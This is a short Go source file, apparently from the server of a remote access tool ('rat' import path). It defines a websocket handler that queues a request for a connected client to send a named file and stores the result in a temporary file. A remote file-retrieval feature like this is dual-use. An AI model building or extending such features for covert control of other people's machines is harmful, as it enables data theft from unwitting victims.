package main

import (
	"io/ioutil"
	"rat/shared/network/header"

	"golang.org/x/net/websocket"
)

type DownloadMessage struct {
	File string `json:"file"`
}

func (d DownloadMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
	file, err := ioutil.TempFile("", "download")
	if err != nil {
		return err
	}

	client.Listeners[header.GetFileHeader] = ws
	Transfers[d.File] = &Transfer{file, d.File, 0, 0}
	client.Queue <- &DownloadPacket{File: d.File}

	return nil
}
